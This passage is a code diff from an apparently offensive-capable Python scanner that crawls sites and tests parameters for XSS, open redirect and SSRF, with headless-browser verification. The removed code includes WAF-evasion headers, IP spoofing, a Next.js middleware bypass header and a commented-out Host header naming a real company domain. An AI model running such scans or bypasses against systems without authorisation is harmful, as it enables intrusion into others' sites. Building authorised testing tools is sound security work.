-        norm_response = html.unescape(response) if response else ""
-        norm_baseline = html.unescape(baseline) if baseline else ""
-        comp = {"reflection": 0, "difference": 0, "structure": 0, "context": 0, "event_handler": 0, "heuristic": 0, "latency": 0, "advanced": 0}
-        reasons: List[str] = []
-        encodings = ScoreEngine.check_encodings(norm_payload, norm_response)
-        if encodings.get("raw"):
-            comp["reflection"] += 40
-            reasons.append("Raw reflection (+40)")
-        elif encodings.get("unescaped"):
-            comp["reflection"] += 30
-            reasons.append("Unescaped reflection (+30)")
-        payload_count = norm_response.lower().count(norm_payload.lower())
-        if payload_count > 1:
-            comp["reflection"] += 10
-            reasons.append("Multiple payload reflections (+10)")
-        if norm_baseline:
-            diff_ratio = difflib.SequenceMatcher(None, norm_baseline, norm_response).ratio()
-            diff_score = int((1 - diff_ratio) * 30)
-            comp["difference"] += diff_score
-            reasons.append(f"HTML Diff (+{diff_score})")
-            base_text = ScoreEngine.strip_html(norm_baseline)
-            resp_text = ScoreEngine.strip_html(norm_response)
-            text_diff = difflib.SequenceMatcher(None, base_text, resp_text).ratio()
-            if text_diff < 0.95:
-                txt_score = int((1 - text_diff) * 15)
-                comp["difference"] += txt_score
-                reasons.append(f"Text Diff (+{txt_score})")
-            length_delta = abs(len(norm_response) - len(norm_baseline))
-            if length_delta > 50:
-                bonus = min(10, length_delta // 50)
-                comp["difference"] += bonus
-                reasons.append(f"Length Delta Bonus (+{bonus})")
+class Pool:
+    def __init__(self,browser,size):
+        self.browser=browser
+        self.size=size
+        self.pool=asyncio.Queue()
+        self.ready=asyncio.Event()
+    
+    async def init(self):
+        for _ in range(self.size):await self._create()
+        if self.pool.qsize()>0:self.ready.set()
+    
+    async def _create(self):
         try:
-            parser = DOMParser()
-            base_structure = parser.extract_structure(norm_baseline)
-            resp_structure = parser.extract_structure(norm_response)
-            struct_ratio = difflib.SequenceMatcher(None, base_structure, resp_structure).ratio()
-            if struct_ratio < 0.95:
-                struct_score = int((1 - struct_ratio) * 20)
-                comp["structure"] += struct_score
-                reasons.append(f"Structure Diff (+{struct_score})")
-        except Exception:
-            reasons.append("Structure Diff error")
-        context_info = AdvancedSmartDetection.analyze_context(norm_response)
-        if context_info.get("confidence", 0) > 0.5:
-            comp["context"] += 10
-            reasons.append("Advanced Context (+10)")
+            if not self.browser.is_connected():return
+            ctx=await self.browser.new_context(ignore_https_errors=True)
+            await ctx.add_init_script(DOM_AGENT)
+            page=await ctx.new_page()
+            await self.pool.put(page)
+        except Exception as e:log.error(f"Page create failed: {e}")
+    
+    async def get(self):
+        await self.ready.wait()
+        return await self.pool.get()
+    
+    async def ret(self,page):
         try:
-            event_handlers = DOMParser().extract_event_handlers(norm_response)
-            if any(norm_payload.strip('"\'' ) in ev for ev in event_handlers):
-                comp["event_handler"] += 15
-                reasons.append("Event Handler Detected (+15)")
-            if "onmouseover" in norm_payload.lower() and "onmouseover" in norm_response.lower():
-                comp["event_handler"] += 5
-                reasons.append("Onmouseover bonus (+5)")
-        except Exception:
-            pass
-        if DOMParser().heuristic_obfuscation_check(norm_response):
-            comp["heuristic"] += 5
-            reasons.append("Heuristic Obfuscation (+5)")
-        # New advanced payload check: look for modern API triggers
-        advanced_triggers = ["ws:", "sendbeacon", "rtcpeerconnection", "fetch("]
-        if any(trigger in norm_response.lower() for trigger in advanced_triggers):
-            comp["advanced"] += 10
-            reasons.append("Advanced Payload Trigger (+10)")
-        latency_delta = resp_latency - base_latency
-        if latency_delta > 0.1:
-            lat_bonus = min(10, int(latency_delta * 20))
-            comp["latency"] += lat_bonus
-            reasons.append(f"Latency Delta Bonus (+{lat_bonus})")
-        raw_total = sum(comp.values())
-        adjusted_total = AdvancedSmartDetection.reduce_false_positives(min(100, raw_total), {"payload": payload})
-        reasons.append(f"Total Score: {adjusted_total}")
-        return adjusted_total, " | ".join(reasons)
-
-# --- Vulnerability Result Object ---
-class VulnResult:
-    def __init__(self, url: str, method: str, param: str, payload: str, score: int,
-                 xss_token: Optional[str] = None, verified: bool = False, severity: str = "Medium",
-                 reason: str = "", pass_count: int = 0, resp_time: float = 0.0) -> None:
-        self.url = url
-        self.method = method
-        self.param = param
-        self.payload = payload
-        self.score = score
-        self.xss_token = xss_token
-        self.verified = verified
-        self.severity = severity
-        self.reason = reason
-        self.pass_count = pass_count
-        self.resp_time = resp_time
-        self.details = {}
-        self.reflection_info = {}
-        self.trigger_conditions = {}
-        self.verification_details = ""
-        self.mitigation = "Review sanitization and encoding."
-
-# --- Request Manager ---
-class RequestManager:
-    UAS: List[str] = [
-        "Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/111 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) Chrome/111 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Ubuntu; rv:111.0) Gecko/20100101 Firefox/111.0"
-    ]
-    def __init__(self) -> None:
-        self.sessions: Dict[str, aiohttp.ClientSession] = {}
-        self.sem = asyncio.Semaphore(CF.get("concurrent_requests"))
-    def get_session(self, domain: str) -> aiohttp.ClientSession:
-        if domain not in self.sessions or self.sessions[domain].closed:
-            conn = TCPConnector(limit=CF.get("max_concurrency"), ssl=False, resolver=BuiltinResolver())
-            self.sessions[domain] = aiohttp.ClientSession(connector=conn)
-        return self.sessions[domain]
-    @staticmethod
-    def shuffle_dict(d: Dict[str, Any]) -> Dict[str, Any]:
-        items = list(d.items())
-        random.shuffle(items)
-        return dict(items)
-    @staticmethod
-    def shuffle_params(params: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
-        random.shuffle(params)
-        return params
-    async def do_request(self, url: str, method: str = "GET", data: Any = None,
-                         extra_headers: Optional[Dict[str, str]] = None, cookies: Any = None,
-                         follow_redirects: bool = True) -> Tuple[int, Optional[str], Dict[str, str], float]:
-        domain = urlparse(url).netloc
-        sess = self.get_session(domain)
-        headers = {
-            "User-Agent": random.choice(self.UAS),
-            ##"Host": "e-invoice.watsons.com.my",
-            "Accept": "text/html,application/xhtml+xml,*/*;q=0.9"
-        }
-        if CF.get("waf_evasion"):
-            headers.update({
-                "X-Requested-With": "XMLHttpRequest",
-                "Referer": f"https://{domain}/",
-                "Cookie": f"session={random.randint(1000,9999)};locale=en",
-                "Cache-Control": "no-cache",
-                "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-            })
-        if CF.get("nextjs_bypass"):
-            headers["x-middleware-subrequest"] = CF.get("nextjs_bypass_payload")
-        if extra_headers:
-            headers.update(extra_headers)
-        headers = self.shuffle_dict(headers)
-        jar = aiohttp.CookieJar(unsafe=True) if cookies else None
-        start = time.perf_counter()
-        try:
-            async with self.sem, sess.request(method, url, headers=headers, data=data,
-                                               timeout=ClientTimeout(total=CF.get("base_timeout")),
-                                               cookies=jar, allow_redirects=follow_redirects) as resp:
-                try:
-                    text = await resp.text(errors="replace")
-                except Exception:
-                    text = ""
-                content_type = resp.headers.get("Content-Type", "")
-                if not any(ct in content_type for ct in ["text", "html", "xml"]):
-                    text = ""
-                duration = time.perf_counter() - start
-                return resp.status, text, dict(resp.headers), duration
-        except Exception as e:
-            logger.debug(f"Request error on {url}: {e}")
-            return 0, None, {}, time.perf_counter() - start
-    async def close_all(self) -> None:
-        for s in self.sessions.values():
+            if not self.browser.is_connected():return
+            if page.is_closed() or not page.context:raise Exception('Closed')
+            await page.goto('about:blank',wait_until='commit')
+            await self.pool.put(page)
+        except:
             try:
-                await s.close()
-            except Exception as e:
-                logger.debug(f"Session close error: {e}")
-    async def __aenter__(self):
-        return self
-    async def __aexit__(self, exc_type, exc, tb):
-        await self.close_all()
+                if page.context:await page.context.close()
+            except:pass
+            asyncio.create_task(self._create())
+    
+    async def shutdown(self):
+        self.ready.clear()
+        while not self.pool.empty():
+            try:
+                page=self.pool.get_nowait()
+                if page.context:await page.context.close()
+                self.pool.task_done()
+            except:break
 
-async def param_reflection_check(url: str, param: str, marker: str, rm: RequestManager) -> Tuple[bool, Dict[str, Any]]:
-    parsed = urlparse(url)
-    qs = parse_qsl(parsed.query, keep_blank_values=True)
-    new_q = [(k, marker if k == param else v) for k, v in qs]
-    new_q = rm.shuffle_params(new_q)
-    inj_url = urlunparse(parsed._replace(query=urlencode(new_q)))
-    status, resp, _, _ = await rm.do_request(inj_url, "GET")
-    if not resp or status in (0, 403):
-        return False, {}
-    reflected = marker in resp
-    return reflected, {"reflected": reflected, "sample": resp[:300]}
+class Verifier:
+    def __init__(self,settings,pool):
+        self.settings=settings
+        self.pool=pool
+    
+    async def verify(self,finding):
+        page=None
+        triggered=asyncio.Event()
+        
+        def on_dialog(dialog):
+            if DIALOG_TAG in dialog.message:
+                triggered.set()
+            try:asyncio.create_task(dialog.accept())
+            except:pass
+        
+        try:
+            page=await self.pool.get()
+            page.on('dialog',on_dialog)
+            timeout=self.settings.timeout*2000
+            
+            if finding.method=='GET':
+                await page.goto(finding.url,timeout=timeout,wait_until='domcontentloaded')
+            else:
+                inputs=''.join(f'<input type="hidden" name="{html.escape(k)}" value="{html.escape(v)}">' for k,v in finding.params.items())
+                content=f'<html><body onload="document.getElementById(\'f\').submit()"><form id="f" method="POST" action="{html.escape(finding.base)}">{inputs}</form></body></html>'
+                await page.set_content(content,wait_until='domcontentloaded',timeout=timeout)
+            
+            if finding.verify_type=='dialog':
+                try:
+                    await asyncio.wait_for(triggered.wait(),timeout=3.5)
+                    return True
+                except asyncio.TimeoutError:return False
+            elif finding.verify_type=='dom_taint':
+                try:
+                    await page.wait_for_function(f"document.body.getAttribute('{TAINT_ATTR}')",timeout=3000)
+                    sink=await page.evaluate(f"document.body.getAttribute('{TAINT_ATTR}')")
+                    finding.context=f"SINK:{sink}"
+                    finding.type='DOM_XSS'
+                    return True
+                except:return False
+            elif finding.verify_type=='time':
+                start=time.time()
+                elapsed=time.time()-start
+                return elapsed>=SLEEP_TIME+1
+            elif finding.verify_type=='dom':
+                try:
+                    await page.wait_for_function(f"document.body.getAttribute('{DOM_ATTR}')==='{DOM_TAG}'",timeout=3000)
+                    return True
+                except:return False
+            return False
+        except Exception as e:
+            if 'Timeout' not in str(type(e).__name__):
+                log.error(f"Verify error: {e}")
+            return False
+        finally:
+            if page:
+                try:page.remove_listener('dialog',on_dialog)
+                except:pass
+                await self.pool.ret(page)
 
-def inject_in_url_path(url: str, payload: str) -> str:
-    parsed = urlparse(url)
-    new_path = parsed.path.rstrip("/") + "/" + payload.lstrip("/")
-    return urlunparse(parsed._replace(path=new_path))
-
-# --- Recursive Crawler ---
 class Crawler:
-    def __init__(self, rm: RequestManager, max_depth: int = 3):
-        self.rm = rm
-        self.max_depth = max_depth
-        self.visited: Set[str] = set()
-    async def crawl(self, url: str, depth: int = 0) -> Set[str]:
-        results = set()
-        if depth > self.max_depth or url in self.visited:
-            return results
-        self.visited.add(url)
-        status, content, _, _ = await self.rm.do_request(url, "GET")
-        if not content or status not in range(200, 300):
-            return results
-        results.add(url)
-        soup = BeautifulSoup(content, BS_PARSER)
-        for a in soup.find_all("a", href=True):
-            abs_link = urljoin(url, a['href'])
-            if urlparse(url).netloc == urlparse(abs_link).netloc:
-                results.update(await self.crawl(abs_link, depth + 1))
-        return results
+    def __init__(self,client,settings,targets,sem,shutdown,pool=None):
+        self.client=client
+        self.pool=pool
+        self.settings=settings
+        self.targets=targets
+        self.visited=set()
+        self.visited_js=set()
+        self.scan_targets={}
+        self.queue=None
+        self.js_queue=asyncio.Queue()
+        self.sem=sem
+        self.shutdown=shutdown
+        self.capped=False
+        self.js_params=set()
+    
+    def _add(self,target):
+        if self.capped:return
+        if len(self.scan_targets)>=self.settings.max_targets:
+            self.capped=True
+            return
+        key=f"{target.vuln}_{target.method}_{target.base}_{sorted(target.params.keys())}"
+        if key not in self.scan_targets:
+            self.scan_targets[key]=target
+            self.targets.put_nowait(target)
+        else:
+            existing=self.scan_targets[key]
+            existing.method=target.method if target.method=='POST' else existing.method
+            for k,v in target.params.items():
+                if k not in existing.params:
+                    existing.params[k]=v
+    
+    async def crawl(self,start,progress,task_id):
+        self.queue=asyncio.Queue()
+        await self.queue.put((start,0))
+        self.visited.add(start)
+        
+        parsed=urlparse(start)
+        domain=parsed.netloc
+        params=parse_qs(parsed.query)
+        
+        if params:
+            p={k:'X' for k in params.keys()}
+            self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),p,'XSS'))
+            for k in params.keys():
+                if k.lower() in self.settings.od_params:
+                    self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{k:self.settings.od_domain},'OD'))
+        
+        for pn in ['file','path','load','image']:
+            if pn not in params:
+                self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{pn:'X'},'SSRF'))
+        
+        base_url=parsed._replace(query='',fragment='').geturl()
+        
+        if self.settings.verify and self.pool:
+            self._add(Target('GET',f"{base_url}#{TAINT_TAG}",{'dom_source':'hash'},'XSS'))
+            self._add(Target('GET',f"{base_url}?{TAINT_TAG}={TAINT_TAG}",{TAINT_TAG:TAINT_TAG},'XSS'))
+        
+        common_endpoints=['/api','/api/v1','/graphql','/search','/login','/register','/user','/profile','/account','/settings','/admin','/dashboard']
+        for endpoint in common_endpoints:
+            if self.capped:break
+            test_url=urljoin(base_url,endpoint)
+            if test_url not in self.visited:
+                self.visited.add(test_url)
+                self.queue.put_nowait((test_url,0))
+                self._add(Target('GET',test_url,{'q':'X'},'XSS'))
+        
+        async def js_worker():
+            while True:
+                try:
+                    js_url=await self.js_queue.get()
+                    if self.shutdown.is_set() or self.capped:
+                        self.js_queue.task_done()
+                        continue
+                    try:await self._parse_js(js_url)
+                    except:pass
+                    finally:self.js_queue.task_done()
+                except asyncio.CancelledError:break
+                except:pass
+        
+        async def crawl_worker():
+            while True:
+                if self.shutdown.is_set():break
+                try:
+                    url,depth=await self.queue.get()
+                    if self.shutdown.is_set():
+                        self.queue.task_done()
+                        continue
+                    try:
+                        if depth>self.settings.depth:continue
+                        
+                        content=''
+                        content_type=''
+                        async with self.sem:
+                            if self.shutdown.is_set():continue
+                            page=None
+                            try:
+                                if self.settings.crawl=='dynamic' and self.pool:
+                                    page=await self.pool.get()
+                                    resp=await page.goto(url,wait_until='networkidle',timeout=self.settings.timeout*3000)
+                                    content=await page.content()
+                                    content_type='text/html'
+                                else:
+                                    r=await self.client.get(url,follow_redirects=True)
+                                    if r.status_code>=400:continue
+                                    content=r.text
+                                    content_type=r.headers.get('content-type','').lower()
+                            except Exception as e:
+                                log.debug(f"Crawl error {url}: {e}")
+                                continue
+                            finally:
+                                if page and self.pool:await self.pool.ret(page)
+                        
+                        if content and ('text/html' in content_type or 'application/json' in content_type or not content_type):
+                            await asyncio.to_thread(self._process,url,content,depth)
+                    except Exception as e:
+                        log.debug(f"Worker error: {e}")
+                    finally:
+                        self.queue.task_done()
+                        progress.update(task_id,completed=len(self.visited),description=f"Crawl: {len(self.visited)} visited, {self.queue.qsize()} queued, {len(self.scan_targets)} targets")
+                except asyncio.CancelledError:break
+                except:pass
+        
+        workers=[asyncio.create_task(crawl_worker()) for _ in range(max(1,self.settings.concurrency//2))]
+        js_workers=[asyncio.create_task(js_worker()) for _ in range(max(1,len(workers)//2))]
+        
+        try:
+            await self.queue.join()
+            await self.js_queue.join()
+        except:pass
+        finally:
+            for w in workers+js_workers:w.cancel()
+            await asyncio.gather(*workers,*js_workers,return_exceptions=True)
+            progress.stop_task(task_id)
+            progress.update(task_id,description=f"Crawl done: {len(self.visited)} visited",completed=len(self.visited))
+    
+    def _process(self,base,content,depth):
+        try:soup=BeautifulSoup(content,'lxml')
+        except:soup=BeautifulSoup(content,'html.parser')
+        
+        self._forms(base,soup)
+        self._links(base,soup,depth)
+        self._scripts(base,soup)
+        self._inline_js(base,soup)
+        self._fuzz(base.split('?')[0])
+    
+    def _fuzz(self,base):
+        if not self.js_params:return
+        for p in self.js_params:
+            if self.capped:return
+            self._add(Target('GET',base,{p:'X'},'XSS'))
+            if p.lower() in self.settings.od_params:
+                self._add(Target('GET',base,{p:self.settings.od_domain},'OD'))
+            if p.lower() in ['file','path','load','image']:
+                self._add(Target('GET',base,{p:'X'},'SSRF'))
+    
+    def _links(self,base,soup,depth):
+        found_urls=set()
+        
+        for a in soup.find_all('a',href=True):
+            if self.capped:return
+            href=a['href'].strip()
+            if href:found_urls.add(href)
+        
+        for elem in soup.find_all(attrs={'data-href':True}):
+            if elem.get('data-href'):found_urls.add(elem['data-href'])
+        
+        for elem in soup.find_all(attrs={'data-url':True}):
+            if elem.get('data-url'):found_urls.add(elem['data-url'])
+        
+        for elem in soup.find_all(attrs={'ng-href':True}):
+            if elem.get('ng-href'):found_urls.add(elem['ng-href'])
+        
+        page_text=soup.get_text()
+        url_pattern=re.findall(r'["\']([/][a-zA-Z0-9/_\-\.]+)["\']',str(soup)[:50000])
+        for u in url_pattern[:100]:
+            if len(u)>3 and not u.endswith(('.js','.css','.png','.jpg','.gif','.svg')):
+                found_urls.add(u)
+        
+        for href in found_urls:
+            if self.capped:return
+            if not href or href.startswith(('#','mailto:','tel:','javascript:','data:')):continue
+            
+            full=urljoin(base,href)
+            parsed=urlparse(full)
+            if parsed.netloc and parsed.netloc!=urlparse(base).netloc:continue
+            
+            if parsed.query:
+                p={k:'X' for k in parse_qs(parsed.query).keys()}
+                self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),p,'XSS'))
+                for k in p.keys():
+                    if k.lower() in self.settings.od_params:
+                        self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{k:self.settings.od_domain},'OD'))
+                    if k.lower() in ['file','path','load','image']:
+                        self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{k:'X'},'SSRF'))
+            
+            crawl_url=parsed._replace(fragment='').geturl()
+            if crawl_url not in self.visited and len(self.visited)<self.settings.depth*20:
+                self.visited.add(crawl_url)
+                if self.queue:self.queue.put_nowait((crawl_url,depth+1))
+    
+    def _scripts(self,base,soup):
+        for s in soup.find_all('script',src=True):
+            if self.capped:return
+            src=s['src'].strip()
+            if not src:continue
+            full=urljoin(base,src)
+            parsed=urlparse(full)
+            if parsed.netloc!=urlparse(base).netloc:continue
+            clean=parsed._replace(query='',fragment='').geturl()
+            if clean not in self.visited_js:
+                self.visited_js.add(clean)
+                self.js_queue.put_nowait(clean)
+    
+    def _forms(self,base,soup):
+        for form in soup.find_all('form'):
+            if self.capped:return
+            action=form.get('action','')
+            method=form.get('method','GET').upper()
+            form_url=urljoin(base,action)
+            if urlparse(form_url).netloc!=urlparse(base).netloc:continue
+            
+            params={}
+            for inp in form.find_all(['input','textarea','select']):
+                name=inp.get('name')
+                if name:params[name]=inp.get('value','X')
+            
+            if not params:continue
+            self._add(Target(method,form_url.split('?')[0],params,'XSS'))
+            for k in params.keys():
+                if k.lower() in self.settings.od_params:
+                    self._add(Target(method,form_url.split('?')[0],{k:self.settings.od_domain},'OD'))
+                if k.lower() in ['file','path','load','image']:
+                    self._add(Target(method,form_url.split('?')[0],{k:'X'},'SSRF'))
+    
+    def _inline_js(self,base,soup):
+        for s in soup.find_all('script'):
+            if self.capped:return
+            if s.get('src'):continue
+            content=s.string
+            if content:self._parse_js_content(content,base)
+    
+    async def _parse_js(self,url):
+        try:
+            async with self.sem:
+                if self.shutdown.is_set():return
+                r=await self.client.get(url)
+                r.raise_for_status()
+            await asyncio.to_thread(self._parse_js_content,r.text,url,True)
+        except:pass
+    
+    def _parse_js_content(self,content,base,update=False):
+        if self.capped:return
+        
+        params=set(re.findall(r'[\'\"](next|url|redirect|return|dest|target|goto|path|file|load|key|id|param|view|sort|item|theme|query|search|q|s|callback|ref|link)["\']',content,re.I))
+        
+        paths=set()
+        paths.update(m[0] for m in re.findall(r'[\'\"]((?:\/|(?:\.\./))[a-zA-Z0-9\\./_-]+?\.(?:js|json|html|php|aspx|jsp|xml))["\']',content,re.I))
+        paths.update(re.findall(r'[\'\"](\/api\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
+        paths.update(re.findall(r'[\'\"](\/graphql[a-zA-Z0-9\/_-]*)["\']',content,re.I))
+        paths.update(re.findall(r'fetch\([\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
+        paths.update(re.findall(r'axios\.(?:get|post)\([\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
+        paths.update(re.findall(r'\$\.(?:get|post|ajax)\([\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
+        
+        endpoints=re.findall(r'endpoint[\'\"]\s*:\s*[\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I)
+        paths.update(endpoints)
+        
+        if update:self.js_params.update(params)
+        if not paths and not params:return
+        
+        p={'js':'1'}
+        for pr in params:p[pr]='X'
+        
+        base_clean=base.split('?')[0]
+        self._add(Target('GET',base_clean,p,'XSS'))
+        
+        for path in paths:
+            if self.capped:return
+            if not path or path.startswith(('#','mailto:','tel:')):continue
+            full=urljoin(base,path)
+            parsed=urlparse(full)
+            if parsed.netloc and parsed.netloc!=urlparse(base).netloc:continue
+            clean=full.split('?')[0].split('#')[0]
+            if clean and clean not in self.visited:
+                self._add(Target('GET',clean,p,'XSS'))
+                if len(self.visited)<self.settings.depth*20:
+                    self.visited.add(clean)
+                    if self.queue:self.queue.put_nowait((clean,0))
 
-# --- Main Scanner ---
-class XSSScanner:
-    def __init__(self) -> None:
-        self.payloads: List[str] = PayloadManager.generate()
-        self.ctx_payloads: Dict[str, List[str]] = PayloadManager.generate_context_aware()
-        self.rm = RequestManager()
-        self.cache = LRUCache(CF.get("max_cache_size"))
-        self.baseline_retries: int = CF.get("baseline_retries")
-        self.dom_parser = DOMParser() if CF.get("use_dom_parser") else None
-        self.blacklist: List[str] = CF.get("blacklist_patterns")
-        self.plugin_manager = PluginManager()
+class Scanner:
+    def __init__(self,client,settings,verify_queue):
+        self.client=client
+        self.settings=settings
+        self.verify_queue=verify_queue
+    
+    async def _send(self,target,data,follow=True):
+        try:
+            if target.method=='GET':
+                query=urlencode(data,safe=':/<>"')
+                url=f"{target.base}?{query}"
+                start=time.time()
+                r=await self.client.get(url,follow_redirects=follow)
+                return url,r,time.time()-start
+            else:
+                start=time.time()
+                r=await self.client.post(target.base,data=data,follow_redirects=follow)
+                return target.base,r,time.time()-start
+        except:pass
+        return target.base,None,0
+    
+    async def _context(self,text,tag):
+        if tag not in text:return 'NONE',0,0.0
+        if tag==TAINT_TAG:return 'DOM_TAINT',100,1.0
+        
+        occurrences=text.count(tag)
+        confidence=min(1.0,occurrences/3.0)
+        if re.search(r'\{\{\s*[^}]*?'+re.escape(tag)+r'[^}]*\s*\}\}',text):return 'TEMPLATE',100,0.95
+        
+        if re.search(f"<!--[^-]*?{re.escape(tag)}[^-]*?-->",text,re.DOTALL):
+            if re.search(f"--\\s*>\\s*({re.escape(tag)})",text,re.I):return 'HTML_TAG',100,0.9
+            return 'HTML_COMMENT',60,0.4
+        
+        m=re.search(f"([\\w\\-]+)\\s*=\\s*(['\"])([^'\"]*?){re.escape(tag)}([^'\"]*?)\\2",text,re.I|re.DOTALL)
+        if m:
+            attr=m.group(1).lower()
+            conf=0.9 if occurrences>1 else 0.7
+            if attr in self.settings.uri_attrs:return 'URI_ATTR',95,conf+0.05
+            if attr in self.settings.event_attrs or attr.startswith('on'):return 'EVENT_ATTR',100,conf+0.1
+            return 'QUOTED_ATTR',90,conf
+        
+        m=re.search(f"([\\w\\-]+)\\s*=\\s*([^>\\s'\"]*?){re.escape(tag)}([^>\\s'\"]*?)",text,re.I|re.DOTALL)
+        if m:
+            attr=m.group(1).lower()
+            conf=0.85 if occurrences>1 else 0.65
+            if attr in self.settings.uri_attrs:return 'URI_UNQUOTED',100,conf+0.1
+            return 'UNQUOTED_ATTR',100,conf+0.05
+        
+        if re.search(f"(?:data|blob):([^,;]*?)[,;][^<]*?{re.escape(tag)}",text,re.I|re.DOTALL):return 'DATA_URL',95,0.85
+        if text.count(tag)>2:return 'MULTI_REFLECT',100,min(1.0,occurrences/5.0)
+        
+        try:
+            soup=BeautifulSoup(text,'lxml')
+            match=soup.find(string=lambda t:isinstance(t,NavigableString) and tag in t)
+            if match:
+                parent=match.parent
+                base_conf=min(0.9,confidence+0.2)
+                if parent and parent.name in['title','textarea','noscript','style','iframe','select','template']:return 'CONSUMING',85,base_conf-0.1
+                if parent and parent.name=='script':
+                    snippet=match.string
+                    if not snippet:return 'HTML_TEXT',60,0.3
+                    if re.search(f"(//|/\\*)\\s*.*{re.escape(tag)}",snippet,re.DOTALL):return 'JS_COMMENT',70,0.5
+                    if re.search(f"([\"']){re.escape(tag)}\\1",snippet):return 'JS_STRING',90,base_conf
+                    if re.search(f"{re.escape(tag)}",snippet):return 'JS_RAW',100,base_conf+0.05
+                if parent and parent.name=='style':return 'CSS_STYLE',80,base_conf-0.15
+                if parent and parent.name not in['textarea','title','pre']:
+                    if re.search(r'\s*<'+re.escape(tag)+r'\s*<meta',text,re.I):return 'IE_FILTER',95,0.8
+                    if 'location=' in text and 'onclick' in text:return 'LOCATION_RECONSTRUCT',100,0.85
+                    has_tab=any(t.get('tabindex') is not None for t in soup.find_all() if tag in str(t))
+                    if has_tab:return 'FOCUS',100,base_conf
+                    if re.search(r'(animation-name|transition:)',text,re.I):return 'TRANSITION',90,base_conf-0.05
+                    return 'HTML_TEXT',100,base_conf
+        except:pass
+        
+        if tag in text:return 'GENERIC',50,max(0.2,confidence-0.3)
+        return 'NONE',0,0.0
+    
+    async def _encoding(self,text,tag):
+        enc=[]
+        esc=html.escape(tag)
+        if esc!=tag and esc in text:
+            if re.search(r'&lt;.*?&gt;',text):enc.append('HTML_FULL')
+            elif re.search(r'&lt;',text):enc.append('HTML_PARTIAL')
+        if re.search(r'\\u[0-9a-f]{4}|%[0-9a-f]{2}',text,re.I):enc.append('UNICODE')
+        if not enc and tag in text:enc.append('RAW')
+        return list(set(enc))
+    
+    async def _reflect(self,target,param):
+        best={'reflected':False,'context':'NONE','score':0,'confidence':0.0,'encodings':[]}
+        tag=self.settings.reflect_tag
+        data=target.params.copy()
+        data[param]=tag
+        
+        for _ in range(1):
+            _,r,_=await self._send(target,data,follow=False)
+            if not r or r.status_code>=400:continue
+            try:text=r.text
+            except:continue
+            
+            ctx,score,conf=await self._context(text,tag)
+            enc=await self._encoding(text,tag)
+            
+            if score>best['score']:
+                best.update({'reflected':True,'context':ctx,'score':score,'confidence':conf,'encodings':enc})
+            if best['score']==100 and conf>=0.8:break
+        
+        if best['reflected']:
+            if any(e in best['encodings'] for e in['HTML_FULL','HTML_PARTIAL']):
+                if best['context'] not in['JS_RAW','JS_STRING','URI_ATTR','URI_UNQUOTED']:
+                    best['score']=max(50,best['score']-15)
+                    best['confidence']=max(0.3,best['confidence']-0.2)
+        
+        return best['reflected'],best['context'],best['score'],best['confidence'],best['encodings']
+    
+    async def _od(self,target,param):
+        payloads=PAYLOADS.get('OD',[])
+        for payload,ptype,sev,score,vtype in payloads:
+            if score<self.settings.filter:continue
+            data=target.params.copy()
+            data[param]=payload
+            
+            try:
+                _,r,_=await self._send(target,data,follow=True)
+                if not r:continue
+                final=str(r.url)
+                if self.settings.od_domain in final:
+                    return Finding(vuln='OD',type=ptype,severity=sev,score=score,base=target.base,url=str(r.url),param=param,payload=payload,verify_type='redirect',method=target.method,params=data,context='REDIRECT_FINAL',verified=True)
+                if r.history:
+                    for hr in r.history:
+                        if self.settings.od_domain in str(hr.headers.get('location','')):
+                            return Finding(vuln='OD',type=ptype,severity=sev,score=score,base=target.base,url=str(r.url),param=param,payload=payload,verify_type='redirect',method=target.method,params=data,context='REDIRECT_CHAIN',verified=True)
+            except:pass
+    
+    async def _ssrf(self,target,param):
+        payloads=PAYLOADS.get('SSRF',[])
+        for payload,ptype,sev,score,vtype in payloads:
+            if score<self.settings.filter:continue
+            data=target.params.copy()
+            data[param]=payload
+            _,r,_=await self._send(target,data)
+            if r and r.status_code<400 and len(r.text)<500:
+                return Finding(vuln='SSRF',type=ptype,severity=sev,score=score,base=target.base,url=r.url,param=param,payload=payload,verify_type='redirect',method=target.method,params=data,context='BLIND_FILE',verified=False)
+    
+    async def _blind(self,target,param):
+        payloads=PAYLOADS.get('BLIND',[])
+        if not payloads:return
+        payload,ptype,sev,score,vtype=payloads[0]
+        if score<self.settings.filter:return
+        data=target.params.copy()
+        data[param]=payload
+        return Finding(vuln='XSS',type=ptype,severity=sev,score=score,base=target.base,url=target.base,param=param,payload=payload,verify_type='time',method=target.method,params=data,context='BLIND_TIME',verified=False)
+    
+    async def scan(self,target,shutdown):
+        if target.vuln=='OD':
+            for param in list(target.params.keys()):
+                if shutdown.is_set():break
+                f=await self._od(target,param)
+                if f:self.verify_queue.put_nowait(f)
+                if self.settings.mode=='QUICK' and f:return
+            return
+        
+        if target.vuln=='SSRF':
+            for param in list(target.params.keys()):
+                if shutdown.is_set():break
+                f=await self._ssrf(target,param)
+                if f:self.verify_queue.put_nowait(f)
+                if self.settings.mode=='QUICK' and f:return
+            return
+        
+        if len(target.params)==1 and 'BLIND' in list(target.params.keys())[0]:
+            f=await self._blind(target,list(target.params.keys())[0])
+            if f:self.verify_queue.put_nowait(f)
+            return
+        
+        if TAINT_TAG in target.url:
+            if not self.settings.verify:return
+            f=Finding(vuln='XSS',type='DOM_TAINT',severity='Critical',score=100,base=target.base,url=target.url,param=list(target.params.keys())[0],payload='TAINT',verify_type='dom_taint',method='GET',params=target.params,context='DOM_TAINT')
+            self.verify_queue.put_nowait(f)
+            return
+        
+        for param in list(target.params.keys()):
+            if shutdown.is_set():break
+            reflected,ctx,score,conf,enc=await self._reflect(target,param)
+            if reflected and score>=60:
